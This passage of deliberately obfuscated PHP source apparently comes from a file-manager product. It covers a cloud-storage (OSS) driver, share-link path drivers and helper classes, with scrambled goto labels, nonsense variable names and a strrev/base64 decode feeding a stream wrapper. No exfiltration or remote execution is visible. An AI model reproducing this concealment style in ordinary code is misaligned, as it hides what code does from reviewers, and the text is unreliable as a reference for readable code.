$AÖÄ‡Ò°ÅŞ[1181]; $Dñô…×Ô†ù = 1048576000 * 5; goto FÀÏ´‹›½Õ; EäÏÖ¾Î¶…: $cÚóí¢½‹ = date($AÖÄ‡Ò°ÅŞ[1180], time() + $bÉ‘ãœ˜); $f—ğ‚¬„ì = new DateTime($cÚóí¢½‹); $A è¤å… è = $f—ğ‚¬„ì->format(DateTime::ISO8601); goto e£¾Æ°„šù; C×à÷»¹Ø½: } public function multiUploadFormData($déò‚ÃÏÂ, $Bİ¢Áßˆƒ– = 3600) { $dï¥ëÌÏ =& $_SERVER[»„]; if (!($eµ££Æ“Å = $this->getHost())) { return !1; } $FŒ×ğÅ´°½ = $this->trafficLimit($dï¥ëÌÏ[1177]); $cõ³ØÇÎá = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($déò‚ÃÏÂ), $FŒ×ğÅ´°½); return array($dï¥ëÌÏ[205] => $cõ³ØÇÎá, $dï¥ëÌÏ[165] => $eµ££Æ“Å . $dï¥ëÌÏ[8] . $this->pathEncode($déò‚ÃÏÂ), $dï¥ëÌÏ[206] => gmdate($dï¥ëÌÏ[1185]), $dï¥ëÌÏ[89] => $déò‚ÃÏÂ); } public function multiUploadAuthData($C«£Œ·¬¾§, $f¸‰Ç†‰ÑÄ = array()) { goto déŒºµ†Ü¡; déŒºµ†Ü¡: $Bó‘†Ìê¸† =& $_SERVER[»„]; $A›Õì»î…Ä = isset($f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[206]]) ? $f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[206]] : gmdate($Bó‘†Ìê¸†[1185]); $C£İŒ’åÛ = isset($f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[156]]) ? $f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[156]] : $Bó‘†Ìê¸†[33]; goto bğŒâÃ½­°; bğŒâÃ½­°: $B«Ö…ÒĞ¬ = $C«£Œ·¬¾§; if (isset($f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[89]])) { $B«Ö…ÒĞ¬ = $f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[89]]; unset($f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[89]]); } if (isset($f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[207]])) { $f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[206]] = $A›Õì»î…Ä; return $this->listUploadParts($B«Ö…ÒĞ¬, $f¸‰Ç†‰ÑÄ); } goto f³…†Œ‚˜Ë; DÕñÃòÔ¿³: $bÃÊáë“ÖÂ = $Bó‘†Ìê¸†[1188] . $this->accessKey . $Bó‘†Ìê¸†[4] . $D„…ï‹–•; if (strpos($C£İŒ’åÛ, $Bó‘†Ìê¸†[209]) === 0) { $bÃÊáë“ÖÂ = array($Bó‘†Ìê¸†[216] => $bÃÊáë“ÖÂ, $Bó‘†Ìê¸†[206] => $A›Õì»î…Ä); if ($B·îØ³®ã) { $bÃÊáë“ÖÂ = array_merge($bÃÊáë“ÖÂ, $B·îØ³®ã); } } return $bÃÊáë“ÖÂ; goto Aµ¬‘Šƒˆ; f³…†Œ‚˜Ë: $fë¢×Ú¹È• = array($Bó‘†Ìê¸†[208], $Bó‘†Ìê¸†[33], $Bó‘†Ìê¸†[115], $A›Õì»î…Ä, "\170\x2d\157\163\163\55\144\141\164\145\x3a{$A›Õì»î…Ä}", $Bó‘†Ìê¸†[8] . $this->bucket . $Bó‘†Ìê¸†[8] . $B«Ö…ÒĞ¬ . $C£İŒ’åÛ); if (strpos($C£İŒ’åÛ, $Bó‘†Ìê¸†[209]) === 0) { $fë¢×Ú¹È•[0] = $Bó‘†Ìê¸†[210]; if ($B·îØ³®ã = $this->trafficLimit($Bó‘†Ìê¸†[1177])) { $B«Ö…ÒĞ¬ = $Bó‘†Ìê¸†[1186]; array_splice($fë¢×Ú¹È•, 5, 0, $B«Ö…ÒĞ¬ . $Bó‘†Ìê¸†[4] . $B·îØ³®ã[$B«Ö…ÒĞ¬]); } } if (isset($f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[211]]) && $f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[211]] == $Bó‘†Ìê¸†[212]) { $fë¢×Ú¹È•[0] = $Bó‘†Ìê¸†[212]; } goto a÷×ÒåöÑó; a÷×ÒåöÑó: if (!empty($f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[1187]])) { $E×¹õ–ê— = array_merge(array($fë¢×Ú¹È•[4]), $f¸‰Ç†‰ÑÄ[$Bó‘†Ìê¸†[1187]]); sort($E×¹õ–ê—); $fë¢×Ú¹È•[4] = implode($Bó‘†Ìê¸†[213], $E×¹õ–ê—); } $EœŸÒñÜ = implode($Bó‘†Ìê¸†[213], $fë¢×Ú¹È•); $D„…ï‹–• = base64_encode(hash_hmac($Bó‘†Ìê¸†[214], $EœŸÒñÜ, $this->secret, !0)); goto DÕñÃòÔ¿³; Aµ¬‘Šƒˆ: } public function listUploadParts($FùÀÁÆëÂµ, $c¶¿ßÏÃÁÌ) { goto fî…ÃŞ¼¶Ú; F™“í«Û§é: unset($c¶¿ßÏÃÁÌ[$FæÅŸÂğØ˜[207]], $c¶¿ßÏÃÁÌ[$FæÅŸÂğØ˜[211]]); $F¾åÆÜáÃ‹ = $this->multiUploadAuthData($FùÀÁÆëÂµ, $c¶¿ßÏÃÁÌ); if (empty($F¾åÆÜáÃ‹)) { return !1; } goto B¼é±’ƒßÂ; B¼é±’ƒßÂ: return array($FæÅŸÂğØ˜[216] => $F¾åÆÜáÃ‹, $FæÅŸÂğØ˜[206] => $c¶¿ßÏÃÁÌ[$FæÅŸÂğØ˜[206]], $FæÅŸÂğØ˜[218] => $dŠìÒÏ„ôË); goto c„áš­·ªÊ; fî…ÃŞ¼¶Ú: $FæÅŸÂğØ˜ =& $_SERVER[»„]; $cøîÉéµ’ = parse_url_query($c¶¿ßÏÃÁÌ[$FæÅŸÂğØ˜[156]]); $AÊ‰ğğ‘ø = $this->client->listParts($this->bucket, $this->pathEncode($FùÀÁÆëÂµ), $cøîÉéµ’[$FæÅŸÂğØ˜[205]]); goto aÒÁéğğÓÀ; aÒÁéğğÓÀ: $cÄÇªæƒÌ¸ = $AÊ‰ğğ‘ø->getListPart(); $dŠìÒÏ„ôË = array(); foreach ($cÄÇªæƒÌ¸ as $c´‘¸´Ãäâ) { $dŠìÒÏ„ôË[] = array($FæÅŸÂğØ˜[1168] => $c´‘¸´Ãäâ->getPartNumber(), $FæÅŸÂğØ˜[1169] => trim($c´‘¸´Ãäâ->getETag(), $FæÅŸÂğØ˜[112])); } goto F™“í«Û§é; c„áš­·ªÊ: } public function download($Fİ  ‡Öå, $B÷Š‹ÍºŠ’) { if ($this->isFolder($Fİ  ‡Öå)) { return !1; } try { $A”ÒÒ¶±İÓ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $B÷Š‹ÍºŠ’); $A”ÒÒ¶±İÓ = $this->trafficLimit($_SERVER[»„][104], $A”ÒÒ¶±İÓ); $this->client->getObject($this->bucket, $this->pathEncode($Fİ  ‡Öå), $A”ÒÒ¶±İÓ); } catch (OSS\Core\OssException $FÂ®“Å¹Û) { return !1; } return $B÷Š‹ÍºŠ’; } public function fileSubstr($b”¶ôØ÷Êâ, $bĞ¬‰î¡ƒƒ = 0, $e°µÇÆ¾ = false) { if ($bĞ¬‰î¡ƒƒ === -1) { $B©ò÷¡”ëÊ = array(); } else { if ($e°µÇÆ¾ === !1) { $eÅâğëğ¶ = $this->size($b”¶ôØ÷Êâ); } else { $eÅâğëğ¶ = $bĞ¬‰î¡ƒƒ + $e°µÇÆ¾ - 1; } $B©ò÷¡”ëÊ = array(OSS\OssClient::OSS_RANGE => "{$bĞ¬‰î¡ƒƒ}\x2d{$eÅâğëğ¶}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($b”¶ôØ÷Êâ), $B©ò÷¡”ëÊ); } catch (OSS\Core\OssException $aÈ»ƒÛ±«) { think_exception($aÈ»ƒÛ±«->getMessage()); return !1; } } private function trafficLimit($C…Ÿèåê–ƒ, $DñáõĞÃôÇ = array()) { goto a¾š–­êÁ; BÏÚÊ¹ : return $DñáõĞÃôÇ; goto a…²Œ‹„Í; a¾š–­êÁ: $Bº’ôËôª =& $_SERVER[»„]; if ($C…Ÿèåê–ƒ == $Bº’ôËôª[1177] && $this->isUploadServer() || $C…Ÿèåê–ƒ == $Bº’ôËôª[104] && $this->isFileOutServer()) { return $DñáõĞÃôÇ; } $EÕ‘ ÏÛø = floatval($GLOBALS[$Bº’ôËôª[6]][$Bº’ôËôª[84]][$Bº’ôËôª[102]][$C…Ÿèåê–ƒ]) * 1024 * 1024 * 8; goto d‚Ê¶ˆğšó; d‚Ê¶ˆğšó: if (!$EÕ‘ ÏÛø) { return $DñáõĞÃôÇ; } $EÕ‘ ÏÛø = $EÕ‘ ÏÛø < 819200 ? 819200 : ($EÕ‘ ÏÛø > 838860800 ? 838860800 : $EÕ‘ ÏÛø); $DñáõĞÃôÇ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($EÕ‘ ÏÛø); goto BÏÚÊ¹ ; a…²Œ‹„Í: } public function link($e…Øà·”îŠ, $fÙÏË« = array()) { $F£»Ğ–Şğë =& $_SERVER[»„]; if (!$this->exist($e…Øà·”îŠ) || $this->isFolder($e…Øà·”îŠ)) { return !1; } try { $fÙÏË« = $this->trafficLimit($F£»Ğ–Şğë[104], $fÙÏË«); $A³šç©µĞ… = $this->client->signUrl($this->bucket, $this->pathEncode($e…Øà·”îŠ), 3600 * 12, $F£»Ğ–Şğë[212], $fÙÏË«); return $this->getCdnLink($A³šç©µĞ…); } catch (OSS\Core\OssException $Aß¯óÇâ³º) { return !1; } } public function fileOut($dğ–ò¹îªÊ, $E´º‡–öº = false, $Eõ³ò„·ŠÓ = false, $c³˜´›²½Á = '') { goto bÔİ¢ÃŸ¬î; có½–Ç¹à: $dŠ½ËçğÓº = get_file_mime(get_path_ext($Eõ³ò„·ŠÓ)); if ($dŠ½ËçğÓº == $DùËİ¾ŒÎ»[197]) { return parent::fileOut($dğ–ò¹îªÊ, $E´º‡–öº, $Eõ³ò„·ŠÓ, $c³˜´›²½Á); } $E´º‡–öº = $E´º‡–öº ? $DùËİ¾ŒÎ»[198] : $DùËİ¾ŒÎ»[199]; goto BƒŠ«àõí; F“½ö¹Î: $this->fileOutLink($BÂ­¡æ´¤å); goto B£¼”œ…›Á; bÔİ¢ÃŸ¬î: $DùËİ¾ŒÎ» =& $_SERVER[»„]; if (!$Eõ³ò„·ŠÓ) { $Eõ³ò„·ŠÓ = $this->pathThis($dğ–ò¹îªÊ); } $Eõ³ò„·ŠÓ = rawurlencode($Eõ³ò„·ŠÓ); goto có½–Ç¹à; BƒŠ«àõí: $B÷†®ÜÑ×¥ = array(OSS\OssClient::OSS_SUB_RESOURCE => $DùËİ¾ŒÎ»[1189] . rawurlencode("{$E´º‡–öº}\x3b\146\x69\x6c\x65\x6e\x61\x6d\x65\75{$Eõ³ò„·ŠÓ}")); $B÷†®ÜÑ×¥[OSS\OssClient::OSS_SUB_RESOURCE] .= $DùËİ¾ŒÎ»[1190] . rawurlencode($dŠ½ËçğÓº); $BÂ­¡æ´¤å = $this->link($dğ–ò¹îªÊ, $B÷†®ÜÑ×¥); goto F“½ö¹Î; B£¼”œ…›Á: } public function fileOutServer($bõøƒÑÊÈ¯, $bĞ‰«¶ç½ = false, $DœÍ½ÊÇ‰Œ = false, $dßêêÌ„†Ç = '') { parent::fileOut($bõøƒÑÊÈ¯, $bĞ‰«¶ç½, $DœÍ½ÊÇ‰Œ, $dßêêÌ„†Ç); } public function fileOutImage($FÙàÌÙéåï, $bàå¾ö­§¡ = 250) { $Aç‹²Ï¹è = array(OSS\OssClient::OSS_PROCESS => $_SERVER[»„][1191] . $bàå¾ö­§¡); $DºÒƒ§¡¬ = $this->link($FÙàÌÙéåï, $Aç‹²Ï¹è); $this->fileOutLink($DºÒƒ§¡¬); } public function fileOutImageServer($Aª´¤šë…, $D›¹è²Œ˜Ö = 250) { parent::fileOutImage($Aª´¤šë…, $D›¹è²Œ˜Ö); } public function fileOutLink($B’Ú©Âß‚¦) { $c¬†ÛŒ‡¹Ò =& $_SERVER[»„]; if (!$this->isCdnHost() && substr($B’Ú©Âß‚¦, 0, 7) == $c¬†ÛŒ‡¹Ò[1096]) { $B’Ú©Âß‚¦ = $c¬†ÛŒ‡¹Ò[1097] . substr($B’Ú©Âß‚¦, 7); } header($c¬†ÛŒ‡¹Ò[152] . $B’Ú©Âß‚¦); die; } public function hashMd5($c‘©Ëµœ‘Û, $b“ËñÁ‚¯Ú = '') { $cš†¢¢ª =& $_SERVER[»„]; $f‰×ÙÁ÷ôÎ = $this->objectMeta($c‘©Ëµœ‘Û); if (!$f‰×ÙÁ÷ôÎ) { return $cš†¢¢ª[33]; } if (!isset($f‰×ÙÁ÷ôÎ[$cš†¢¢ª[1164]]) && !empty($b“ËñÁ‚¯Ú)) { $b”ãÁ²Â‰– = $this->updateObjMeta($c‘©Ëµœ‘Û, array($cš†¢¢ª[1164] => $b“ËñÁ‚¯Ú)); $f‰×ÙÁ÷ôÎ[$cš†¢¢ª[1164]] = $b”ãÁ²Â‰– ? $b“ËñÁ‚¯Ú : $cš†¢¢ª[33]; } return isset($f‰×ÙÁ÷ôÎ[$cš†¢¢ª[1164]]) ? strtolower($f‰×ÙÁ÷ôÎ[$cš†¢¢ª[1164]]) : $cš†¢¢ª[33]; } public function size($BáĞ ¬¿ÙÉ) { $F˜º…–ƒÆ´ = $this->objectMeta($BáĞ ¬¿ÙÉ); return $F˜º…–ƒÆ´ ? $F˜º…–ƒÆ´[$_SERVER[»„][77]] : 0; } public function info($F¤Û‘Âô’») { if ($this->isFolder($F¤Û‘Âô’»)) { return $this->folderInfo($F¤Û‘Âô’»); } else { if ($this->isFile($F¤Û‘Âô’»)) { return $this->fileInfo($F¤Û‘Âô’»); } } return !1; } public function exist($e‘Û´É¼œŒ) { return $this->isFile($e‘Û´É¼œŒ) || $this->isFolder($e‘Û´É¼œŒ); } public function isFile($fê¿ßé’‘é) { return !$this->isFolder($fê¿ßé’‘é) && $this->objectMeta($fê¿ßé’‘é); } public function isFolder($C·É±ŸšĞœ) { return $this->cacheMethod($_SERVER[»„][219], $C·É±ŸšĞœ); } protected function objectMeta($D¯àºñ—Ëğ) { return $this->cacheMethod($_SERVER[»„][220], $D¯àºñ—Ëğ); } protected function _objectMeta($ağ†š¦ã™‰) { $eÁŞÔ˜ší =& $_SERVER[»„]; try { $E¨Ïİ‹´Š¿ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ağ†š¦ã™‰)); } catch (OSS\Core\OssException $fš±‡Ãé) { $E¨Ïİ‹´Š¿ = !1; } if ($E¨Ïİ‹´Š¿) { $E¨Ïİ‹´Š¿[$eÁŞÔ˜ší[77]] = intval($E¨Ïİ‹´Š¿[$eÁŞÔ˜ší[1171]]); } return $E¨Ïİ‹´Š¿; } protected function _isFolder($Eİàº±¿íù) { $Bô‹ÌÚ„¯Ñ =& $_SERVER[»„]; if ($Eİàº±¿íù == $Bô‹ÌÚ„¯Ñ[33] || $Eİàº±¿íù == $Bô‹ÌÚ„¯Ñ[8]) { return !0; } $aŠœ ÄÂá² = array($Bô‹ÌÚ„¯Ñ[1161] => $Bô‹ÌÚ„¯Ñ[8], $Bô‹ÌÚ„¯Ñ[182] => rtrim($Eİàº±¿íù, $Bô‹ÌÚ„¯Ñ[8]) . $Bô‹ÌÚ„¯Ñ[8], $Bô‹ÌÚ„¯Ñ[1162] => 1, $Bô‹ÌÚ„¯Ñ[1163] => $Bô‹ÌÚ„¯Ñ[33]); $c°Ö«™ï‘ = $this->client->listObjects($this->bucket, $aŠœ ÄÂá²); if ($c°Ö«™ï‘->getObjectList() || $c°Ö«™ï‘->getPrefixList()) { return !0; } return !1; } } goto E¸ÌâÇ“œÂ; E‹‚Ï¬• ª: function beforeShutdownError($a¢»ˆ£ƒ¶› = false, $Dˆ´©«¿„ = '', $b®¥¿Ã™† = '', $aìÔË²‘£ = 0) { $F¥«Í‹ä…© =& $_SERVER[ÓÊÌ]; switch ($a¢»ˆ£ƒ¶›) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $bÃÚÏ¦í = $F¥«Í‹ä…©[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $bÃÚÏ¦í = $F¥«Í‹ä…©[40]; break; case E_STRICT: $bÃÚÏ¦í = $F¥«Í‹ä…©[41]; break; case E_NOTICE: case E_USER_NOTICE: $bÃÚÏ¦í = $F¥«Í‹ä…©[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $bÃÚÏ¦í = $F¥«Í‹ä…©[43]; break; default: break; } if (!$bÃÚÏ¦í || $bÃÚÏ¦í == $F¥«Í‹ä…©[42] || $bÃÚÏ¦í == $F¥«Í‹ä…©[43]) { return; } $b®¥¿Ã™† = $F¥«Í‹ä…©[4] . str_replace($_SERVER[$F¥«Í‹ä…©[37]], $F¥«Í‹ä…©[20], $b®¥¿Ã™†); $EÔÏĞù½¨Á = $bÃÚÏ¦í . $F¥«Í‹ä…©[44] . $Dˆ´©«¿„ . $F¥«Í‹ä…©[44] . $b®¥¿Ã™† . $F¥«Í‹ä…©[44] . $aìÔË²‘£; write_log($EÔÏĞù½¨Á . $F¥«Í‹ä…©[18] . get_caller_msg(1), $F¥«Í‹ä…©[19]); } $_SERVER[$_SERVER[ÓÊÌ][45]] = $_SERVER[$_SERVER[ÓÊÌ][37]] . $_SERVER[ÓÊÌ][46]; $CÒ“×“¢¤‡ = strrev(base64_decode($_SERVER[ÓÊÌ][47])); goto bçîÒæßÇç; bª¢±«³Œß: class PathDriverDbShareLink extends PathDriverDB { public function __construct($DˆºÆè¦•Ô) { $this->pathParse = $DˆºÆè¦•Ô; $this->model = Model($_SERVER[»„][1098]); } protected function infoParse($EÆå‘÷öÅ¸, $DÄÅÉŒ¯µË = false, $D¾Ãñ°Öå¯ = false) { $Dœµ…‚÷» =& $_SERVER[»„]; return Action($Dœµ…‚÷»[1005])->sharePathInfo($this->pathParse[$Dœµ…‚÷»[75]], !0); } public function listPath($B«ä£É¤®¯, $CØ‹Î‰àÃ¬ = false) { $b˜††Æ‡á =& $_SERVER[»„]; $f‚‘¥°¡Šä = parent::listPath($B«ä£É¤®¯, $CØ‹Î‰àÃ¬); foreach ($f‚‘¥°¡Šä as $E¤Æ´×Èöø => $A•Ìãª‚) { if (!in_array($E¤Æ´×Èöø, array($b˜††Æ‡á[73], $b˜††Æ‡á[74]))) { continue; } foreach ($A•Ìãª‚ as $eá—Ù–°²¥ => $C“÷ÅÄˆ) { $f‚‘¥°¡Šä[$E¤Æ´×Èöø][$eá—Ù–°²¥] = Action($b˜††Æ‡á[1005])->shareItemInfo($C“÷ÅÄˆ); } } return $f‚‘¥°¡Šä; } public function listAll($aÈ²­»ˆŒ) { $bÌ§¥ë‡–° =& $_SERVER[»„]; $eå¢ËËÁÙ = IO::info($this->pathParse[$bÌ§¥ë‡–°[75]]); if (!$eå¢ËËÁÙ) { return array(); } $D‚®••‘È = $this->model->listAll($aÈ²­»ˆŒ); foreach ($D‚®••‘È as &$BŸ›åƒŸŠÓ) { $BŸ›åƒŸŠÓ[$bÌ§¥ë‡–°[387]] = Action($bÌ§¥ë‡–°[1005])->shareItemInfo($BŸ›åƒŸŠÓ[$bÌ§¥ë‡–°[387]]); } return $D‚®••‘È; } } class PathDriverDriverShareItem { public function __construct($E•£°Ôİõ†) { $this->pathParse = $E•£°Ôİõ†; } public function __call($FÏ‡ËõÄÊ, $e–®§‰¿–) { $AÔ‰óã„¥Ú =& $_SERVER[»„]; if (method_exists($this, $FÏ‡ËõÄÊ)) { return; } $bùÈ¢Š‚Ÿƒ = call_user_func_array(array($AÔ‰óã„¥Ú[1105], $FÏ‡ËõÄÊ), $e–®§‰¿–); $a©Õ²õ¹ğ£ = array($AÔ‰óã„¥Ú[1106], $AÔ‰óã„¥Ú[1107], $AÔ‰óã„¥Ú[1108], $AÔ‰óã„¥Ú[1109], $AÔ‰óã„¥Ú[486], $AÔ‰óã„¥Ú[488], $AÔ‰óã„¥Ú[1110], $AÔ‰óã„¥Ú[102], $AÔ‰óã„¥Ú[1111], $AÔ‰óã„¥Ú[1112]); if (in_array($FÏ‡ËõÄÊ, $a©Õ²õ¹ğ£)) { $bùÈ¢Š‚Ÿƒ = $this->getPathOuter($bùÈ¢Š‚Ÿƒ); } return $bùÈ¢Š‚Ÿƒ; } public function copy($DáğÆ¸Ÿˆì, $EùÔÜ†¯, $b×™¤ßÙ¢Ç = false) { return $this->copyMove($DáğÆ¸Ÿˆì, $EùÔÜ†¯, $b×™¤ßÙ¢Ç, $_SERVER[»„][486]); } public function move($b´¯¸ƒ³», $aÏÇÉÎ‹÷‹, $C§ø‡µá‘ = false) { return $this->copyMove($b´¯¸ƒ³», $aÏÇÉÎ‹÷‹, $C§ø‡µá‘, $_SERVER[»„][488]); } private function copyMove($eåîÆŒÕ‡¤, $A›ÇŸ‡º©, $a½É¬»óÏÁ, $d”‚¾ çö‘) { goto AÄÈ¹Ş½¡ì; fÎ£Àï‘: if ($F§¢æ¶¬òö->pathParse[$c‹ÍœÒãÖÑ[986]]) { $A›ÇŸ‡º© = $F§¢æ¶¬òö->pathParse[$c‹ÍœÒãÖÑ[986]]; } else { $A›ÇŸ‡º© = $bÊ¤±…‹ï×; } $C¿í“¦¼°ƒ = IO::copyMove($eåîÆŒÕ‡¤, $A›ÇŸ‡º©, $a½É¬»óÏÁ, $d”‚¾ çö‘); $C¿í“¦¼°ƒ = $this->getPathOuter($C¿í“¦¼°ƒ); goto F¹Í”î°ó; AÄÈ¹Ş½¡ì: $c‹ÍœÒãÖÑ =& $_SERVER[»„]; $bÊ¤±…‹ï× = $A›ÇŸ‡º©; $F§¢æ¶¬òö = IO::driverMake($A›ÇŸ‡º©); goto fÎ£Àï‘; F¹Í”î°ó: return $C¿í“¦¼°ƒ; goto cÄ¼®îÄÄ°; cÄ¼®îÄÄ°: } public function pathFather($F ­Ò«¨¹Ø) { return get_path_father($this->pathParse[$_SERVER[»„][75]]); } public function iconvSystem($a¢ªóö …£) { return $a¢ªóö …£; } protected function infoParse($BÉ‰ôÍ¸Ëñ) { $BÅŸ£ô°Î® =& $_SERVER[»„]; $bëæÄ ”¶Û = $this->pathParse[$BÅŸ£ô°Î®[435]][$BÅŸ£ô°Î®[1006]] . $this->pathParse[$BÅŸ£ô°Î®[999]]; $d½ˆ•¶Ñ£Š = IO::info($bëæÄ ”¶Û); $a¦æİíß¡˜ = $this->pathParse[$BÅŸ£ô°Î®[435]]; return Action($BÅŸ£ô°Î®[1104])->_shareItemeParse($d½ˆ•¶Ñ£Š, $a¦æİíß¡˜); } public function listAll($B‹„Ú‡ª¡) { $bÜÅ‡ø„› =& $_SERVER[»„]; $f¬š‚Ãòãà = IO::listAll($B‹„Ú‡ª¡); $eï£Ğ‘‹° = $this->pathParse[$bÜÅ‡ø„›[435]]; foreach ($f¬š‚Ãòãà as &$fÜ£ëîÙñÆ) { check_abort(); $fÜ£ëîÙñÆ = array_merge(IO::info($fÜ£ëîÙñÆ[$bÜÅ‡ø„›[75]]), $fÜ£ëîÙñÆ); $fÜ£ëîÙñÆ[$bÜÅ‡ø„›[387]] = Action($bÜÅ‡ø„›[1104])->_shareItemeParse($fÜ£ëîÙñÆ, $eï£Ğ‘‹°); } return $f¬š‚Ãòãà; } public function getPathOuter($dÙ¥’ÜŸé) { goto e…›ØËÂ²; e…›ØËÂ²: $f‘ä²¼ƒ· =& $_SERVER[»„]; $bË¡ÎñÈ­ = KodIO::parse($dÙ¥’ÜŸé); if ($bË¡ÎñÈ­[$f‘ä²¼ƒ·[29]] == KodIO::KOD_SHARE_ITEM) { return $bË¡ÎñÈ­[$f‘ä²¼ƒ·[75]]; } goto DÍÎò•¼; dŠšÖÏ‰¬Ô: if (substr($a÷Òå±±Ù‚, 0, strlen($C”±Ÿå·ø)) != $C”±Ÿå·ø) { return !1; } return $this->pathParse[$f‘ä²¼ƒ·[1000]] . $f‘ä²¼ƒ·[8] . ltrim($e“Ç³Ã¥’è, $f‘ä²¼ƒ·[8]); goto a¼ò½Œí‘î; DÍÎò•¼: $a÷Òå±±Ù‚ = KodIO::clear($dÙ¥’ÜŸé); $C”±Ÿå·ø = KodIO::clear($this->pathParse[$f‘ä²¼ƒ·[435]][$f‘ä²¼ƒ·[1006]]); $e“Ç³Ã¥’è = substr($a÷Òå±±Ù‚, strlen($C”±Ÿå·ø)); goto dŠšÖÏ‰¬Ô; a¼ò½Œí‘î: } public function getType() { $E”½Œæ„¦Ø =& $_SERVER[»„]; $AÆ‚˜¯á¥» = str_replace($E”½Œæ„¦Ø[71], $E”½Œæ„¦Ø[33], get_class($this)); return strtolower($AÆ‚˜¯á¥»); } public function isTypeObject($cŒÄ²İŞŒÅ) { return IO::isTypeObject($cŒÄ²İŞŒÅ); } public function info($f£˜¾—ÍÄ²) { return $this->infoParse($f£˜¾—ÍÄ²); } public function infoAuth($aš‚Ò‹›ò) { return $this->infoParse($aš‚Ò‹›ò); } public function infoWithChildren($A¼Í‰¢Šğ†) { return $this->infoParse($A¼Í‰¢Šğ†); } public function infoFull($AƒÇÛÌ¦š’) { return $this->infoParse($AƒÇÛÌ¦š’); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($C»íĞÎ´Úï) { $this->pathParse = $C»íĞÎ´Úï; } protected function infoParse($Fà¤¦’‘³Ä) { $FÖÓƒ¶¬æ£ =& $_SERVER[»„]; return Action($FÖÓƒ¶¬æ£[1005])->sharePathInfo($this->pathParse[$FÖÓƒ¶¬æ£[75]], !0); } public function listPath($Fõ§İˆ†à‘, $f·í¡ààÍ = false) { $cÎİµÜ¼ç =& $_SERVER[»„]; $c æ¥¦š¦¾ = IO::listPath($Fõ§İˆ†à‘, $f·í¡ààÍ); foreach ($c æ¥¦š¦¾ as $EïºŒ˜êÄ‘ => $f¾ˆäò) { if (!in_array($EïºŒ˜êÄ‘, array($cÎİµÜ¼ç[73], $cÎİµÜ¼ç[74]))) { continue; } foreach ($f¾ˆäò as $Eê³ÚõñÛ => $dÅ‰é‘‡¯) { $dÅ‰é‘‡¯ = Action($cÎİµÜ¼ç[1113])->parsePathChildren($dÅ‰é‘‡¯, array($cÎİµÜ¼ç[383] => $Fõ§İˆ†à‘)); $c æ¥¦š¦¾[$EïºŒ˜êÄ‘][$Eê³ÚõñÛ] = Action($cÎİµÜ¼ç[1005])->shareItemInfo($dÅ‰é‘‡¯); } } return $c æ¥¦š¦¾; } public function listAll($d‡òÄï÷…‰) { $EŞ”±Øì¿œ =& $_SERVER[»„]; $CË¹õ¿½ = IO::listAll($d‡òÄï÷…‰); foreach ($CË¹õ¿½ as &$dŒ¾ÂÆ¿‚) { $dŒ¾ÂÆ¿‚ = array_merge(IO::info($dŒ¾ÂÆ¿‚[$EŞ”±Øì¿œ[75]]), $dŒ¾ÂÆ¿‚); $dŒ¾ÂÆ¿‚[$EŞ”±Øì¿œ[387]] = Action($EŞ”±Øì¿œ[1005])->shareItemInfo($dŒ¾ÂÆ¿‚); } return $CË¹õ¿½; } } goto cÛ›ä£‡¦; f“Š‹è´×æ: $_SERVER[$_SERVER[ÓÊÌ][52]] = ("\71\64\70\62"."\63\60")+0;$_enDg="QfDwRXy889tCnuGRRYng6awqagcBcRsrC95qvbX5mSCVFNj4F4dNp4UMnxIjFyKahG7UVKwgt97ZBPQmQf";; stream_wrapper_register($_SERVER[ÓÊÌ][53], $_SERVER[ÓÊÌ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($FÎ¥Õ¤»·ğ, $DåéÂºô­Ç) { $Då¹»¯¶…® =& $_SERVER[»„]; if (isset(self::$_methodList[$FÎ¥Õ¤»·ğ])) { return @call_user_func_array(self::$_methodList[$FÎ¥Õ¤»·ğ], $DåéÂºô­Ç); } else { if (method_exists($this, $FÎ¥Õ¤»·ğ)) { return call_user_func_array(array($this, $FÎ¥Õ¤»·ğ), $DåéÂºô­Ç); } else { think_exception(__CLASS__ . $Då¹»¯¶…®[4] . $FÎ¥Õ¤»·ğ . $Då¹»¯¶…®[5]); } } } public static function __callStatic($CÃ”ãË´ƒí, $BÖœ¨®÷­Í) { if (isset(self::$_methodListStatic[$CÃ”ãË´ƒí])) { return call_user_func_array(self::$_methodListStatic[$CÃ”ãË´ƒí], $BÖœ¨®÷­Í); } else { if (method_exists(self, $CÃ”ãË´ƒí)) { return call_user_func_array(array(self, $CÃ”ãË´ƒí), $BÖœ¨®÷­Í); } else { show_json("{$CÃ”ãË´ƒí}\x28\x29\40\x6e\157\x74\40\145\x78\151\x73\164\73", !1); } } } public static function addMethod($d·Ì‹Å×ô, $eŠÄÛœçÒÅ) { self::$_methodList[$d·Ì‹Å×ô] = $eŠÄÛœçÒÅ; } public static function addMethodStatic($e‰ãÔ£áƒ, $Aè¶ĞŞ›‡À) { self::$_methodListStatic[$e‰ãÔ£áƒ] = $Aè¶ĞŞ›‡À; } } goto B˜¦ÜµÙ; F­÷ï‹åå¼: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($bŞ¿Ì…ê©‚) { $d¶‚ä´¼” =& $_SERVER[»„]; $fÈÎõñÒ´Œ = array($d¶‚ä´¼”[531] => array($d¶‚ä´¼”[29] => $d¶‚ä´¼”[1998], $d¶‚ä´¼”[257] => array($d¶‚ä´¼”[206], $d¶‚ä´¼”[688], 